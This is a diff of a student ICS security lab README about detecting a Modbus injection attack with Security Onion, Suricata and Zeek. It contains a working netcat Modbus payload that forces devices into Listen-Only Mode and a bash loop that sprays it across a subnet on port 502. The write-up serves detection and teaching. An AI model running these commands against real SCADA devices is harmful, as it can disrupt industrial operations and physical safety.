@@ -1,143 +1,163 @@
-# SCADA-Modbus-Attack-Detection-with-Security-Onion
+# SCADA Modbus Attack Detection - ICS Security Monitoring with Security Onion
 
-## Overview
-This project demonstrates how to monitor and detect Modbus-based attacks against a SCADA system using Security Onion.
+A hands-on OT/ICS security lab simulating a Modbus packet injection attack against a SCADA environment and detecting the malicious activity using Security Onion, Suricata, Zeek, and Wireshark - demonstrating core industrial control system threat detection workflows.
 
-The lab environment consisted of three virtual machines:
-- Security Onion – network monitoring and intrusion detection platform
-- Modsak1 – SCADA slave device
-- Modsak2 – SCADA master controller
-The objective was to:
-- establish network communication between SCADA devices
-- monitor Modbus traffic using Security Onion
-- perform a Modbus packet injection attack
-- detect the malicious activity using Suricata, Zeek, and Wireshark
+---
 
 ## Lab Environment
-| System         | Role                     |
-| -------------- | ------------------------ |
+
+| System | Role |
+|---|---|
 | Security Onion | Network monitoring & IDS |
-| Modsak1        | Modbus Slave             |
-| Modsak2        | Modbus Master            |
+| Modsak1 | Modbus Slave device |
+| Modsak2 | Modbus Master controller |
 
 **Network Configuration**
-All systems were configured using:
-- **Host-Only Adapter** -> internal SCADA network communication
-- **Bridged Adapter (Security Onion only)** -> system updates and external access
-After configuration, the virtual machines were restarted to apply network changes.
+
+| Adapter | Purpose |
+|---|---|
+| Host-Only | Internal SCADA network communication between all VMs |
+| Bridged (Security Onion only) | System updates and external access |
+
+---
 
 ## Security Onion Configuration
-Security Onion was configured to monitor SCADA traffic.
-**Steps performed**
-1. Accessed the Security Onion web interface
-2. Created a network sensor
-3. Enabled:
-    - Suricata for intrusion detection
-    - Zeek for deep packet inspection
-4. Created a custom Suricata rule to detect suspicious Modbus commands
-This configuration allowed the monitoring system to analyze industrial control system traffic.
 
-## SCADA Communication Verification
-To confirm normal operation of the SCADA environment, a Modbus command was sent from the master to the slave.
+Security Onion was configured to monitor SCADA traffic before the attack simulation:
 
-**Test Command**
-**Report Slave ID**
-Traffic was verified using Wireshark, which confirmed:
-- successful communication between Modsak2 and Modsak1
-- correct Modbus packet structure
-- hex payload values needed for later attack simulation
-This step ensured the environment was functioning normally before launching the attack.
+1. Accessed the Security Onion web interface and created a network sensor
+2. Enabled **Suricata** for signature-based intrusion detection
+3. Enabled **Zeek** for deep packet inspection and protocol analysis
+4. Authored a **custom Suricata rule** to detect suspicious Modbus commands
 
-## Modbus Packet Injection Attack
-After confirming normal communication, a malicious Modbus packet was constructed to force the slave device into Listen-Only Mode.
+---
 
-**Attack Goal**
-Disable responses from the slave device, preventing communication with the master controller.
+## SCADA Communication Baseline
 
-**Attack Method**
-The attack packet was transmitted using Netcat with a predefined hexadecimal payload.
+Before launching the attack, normal Modbus communication between master and slave was verified to establish a clean baseline.
 
-Once the packet was sent:
+**Test command:** Report Slave ID (Modbus Function Code 0x11)
+
+Wireshark confirmed:
+- Successful communication between Modsak2 → Modsak1
+- Correct Modbus packet structure
+- Hex payload values recorded for attack simulation reference
+
+![Modbus Traffic Baseline](01_Modbus_traffic.png)
+
+---
+
+## Attack Simulation
+
+### Modbus Packet Injection - Listen-Only Mode
+
+A malicious Modbus packet was crafted to force the slave device into **Listen-Only Mode**, disabling its responses and severing SCADA communication.
+
+**Attack method:** Netcat with a predefined hex payload targeting port 502
+
+```bash
+printf '\x00\x02\x00\x00\x00\x02\x01\x11\x08\x04' | nc 192.168.255.x 502
+```
+
+**Result:**
 - Modsak1 entered Listen-Only Mode
-- the slave stopped responding to the master
-- SCADA communication was disrupted
-Security Onion successfully logged the malicious traffic.
+- Slave stopped responding to the master controller
+- SCADA communication fully disrupted
+- Security Onion logged the malicious traffic
 
-## Automated SCADA Attack Script
-To simulate a larger-scale attack, a Bash script was used to send the injection packet across an entire subnet.
+### Automated Subnet-Wide Attack Script
 
+To simulate a larger-scale ICS attack, the injection was automated across an entire subnet - replicating how an attacker would sweep for exposed Modbus devices:
+
+```bash
 for i in {1..254}; do
-echo "Attacking 192.168.255.$i"
-printf '\x00\x02\x00\x00\x00\x02\x01\x11\x08\x04' | nc 192.168.255.$i 502
+  echo "Attacking 192.168.255.$i"
+  printf '\x00\x02\x00\x00\x00\x02\x01\x11\x08\x04' | nc 192.168.255.$i 502
 done
+```
 
-This script attempted the attack against every possible device in the subnet.
+Security Onion logs captured multiple injection attempts across the subnet, demonstrating the scale potential of protocol-level ICS attacks.
 
-Security Onion logs showed multiple Modbus injection attempts, demonstrating how such attacks could scale in real-world ICS environments.
+![Automated Attack Script Execution](02_Attack_Automation.png)
 
-## Detection in Security Onion
-The attack activity was detected using multiple monitoring tools:
+---
 
-**Suricata**
-- detected suspicious Modbus commands
-- triggered intrusion alerts
+## Detection Results
 
-**Zeek**
-- analyzed industrial protocol traffic
-- logged abnormal Modbus communication patterns
+### Suricata
+- Custom rule triggered on malicious Modbus function code
+- Intrusion alerts generated for each injection attempt
+- Subnet sweep flagged as repeated anomalous activity
 
-**Wireshark**
-- verified packet structure
-- confirmed attack payload transmission
-These tools provided layered visibility into SCADA network activity.
+### Zeek
+- Industrial protocol traffic analyzed at packet level
+- Abnormal Modbus communication patterns logged
+- Connection metadata recorded for forensic timeline
 
-## Challenges Encountered
-Several issues occurred during the lab setup.
+### Wireshark
+- Attack payload structure verified at hex level
+- Confirmed transmission of malicious Modbus packet
+- Packet capture validated detection accuracy
 
-**Network Connectivity Issues**
-Error: No Route to Host
+![Wireshark Packet Analysis](03_Wireshark_Analysis_.png)
 
-Solution:
-- verified all VMs were configured in Host-Only mode
-- restarted network services
+---
 
-**SCADA Traffic Not Captured**
-Security Onion initially failed to capture Modbus packets.
+## MITRE ATT&CK for ICS Mapping
 
-Solution:
-- verified correct network interface monitoring
-- restarted the Security Onion sensor
+| Technique | ID | Evidence |
+|---|---|---|
+| Modify Parameter | T0836 | Modbus command forced slave into Listen-Only Mode |
+| Network Scanning | T0840 | Automated subnet sweep across all 254 hosts on port 502 |
+| Exploitation of Remote Services | T0866 | Unauthenticated Modbus command accepted by slave |
+| Denial of Service | T0814 | SCADA communication disrupted via Listen-Only Mode |
+| Commonly Used Port | T0885 | Attack transmitted over Modbus default port 502 |
 
-**IDS Alerts Not Triggering**
-Some attack packets were not initially logged.
+---
 
-Solution:
-- adjusted Suricata detection thresholds
-- replayed attack traffic to verify detection
+## Key Vulnerability - Unauthenticated Modbus Protocol
+
+Modbus has **no built-in authentication or encryption**. Any device on the network can send arbitrary function codes to a Modbus slave — no credentials required. This is the fundamental weakness exploited in this lab and a systemic issue across legacy ICS environments still running Modbus, DNP3, and similar protocols.
+
+---
+
+## Defensive Recommendations
+
+| Control | Purpose |
+|---|---|
+| Network segmentation (IT/OT isolation) | Prevent attackers from reaching ICS devices from corporate network |
+| ICS-aware IDS (Suricata custom rules) | Detect abnormal Modbus function codes and command sequences |
+| Allowlist legitimate Modbus masters | Block commands from unauthorized source IPs |
+| Protocol-level monitoring (Zeek) | Log all Modbus traffic for anomaly detection and forensics |
+| Disable unused Modbus function codes | Reduce attack surface at the device configuration level |
+| Deploy Modbus firewall / protocol gateway | Enforce command validation before packets reach slave devices |
+
+---
+
+## Challenges & Resolutions
+
+| Issue | Resolution |
+|---|---|
+| `No Route to Host` error | Verified all VMs in Host-Only mode, restarted network services |
+| Security Onion not capturing Modbus traffic | Confirmed correct monitoring interface, restarted sensor |
+| Suricata alerts not triggering | Adjusted detection thresholds, replayed attack traffic to verify |
+
+---
+
+## Key Takeaway
+
+Legacy ICS protocols like Modbus were designed for reliability in isolated environments - not for security in networked ones. The absence of authentication means any device on the network can issue commands with full authority over industrial equipment. This lab demonstrates that even basic network monitoring with open-source tools like Security Onion can surface these attacks but prevention requires segmentation and protocol-level controls, not detection alone.
+
+---
 
 ## Skills Demonstrated
-- SCADA / ICS network monitoring
-- Modbus protocol analysis
-- Security Onion deployment
-- Suricata rule creation
-- Zeek network analysis
-- Packet inspection with Wireshark
-- Modbus packet injection
-- Bash scripting for network attacks
 
-## Key Takeaways
-This lab demonstrated how industrial control systems can be disrupted using protocol-level attacks.
+`ICS/OT Security` `SCADA Monitoring` `Modbus Protocol Analysis` `Security Onion Deployment` `Custom Suricata Rule Creation` `Zeek Network Analysis` `Wireshark Packet Inspection` `Bash Scripting` `MITRE ATT&CK for ICS` `Incident Detection`
 
-It also showed the importance of:
-- monitoring ICS network traffic
-- deploying intrusion detection systems
-- analyzing protocol behavior for anomalies
+---
 
-Security Onion proved effective for detecting malicious Modbus activity and highlighting vulnerabilities in SCADA environments.
+> All attack activity was performed in an isolated virtual lab environment. No real industrial systems were involved.
 
-## Author
-Durga Sai Sri Ramireddy </br>
-Master's Student - Cybersecurity </br>
-University of Houston
-
-*This project was developed as part of academic coursework and expanded for cybersecurity portfolio demonstration.*
+**Author:** Durga Sai Sri Ramireddy | MS Cybersecurity, University of Houston  
+[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0072b1?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/durga-ramireddy)
+[![GitHub](https://img.shields.io/badge/-GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/DurgaRamireddy)
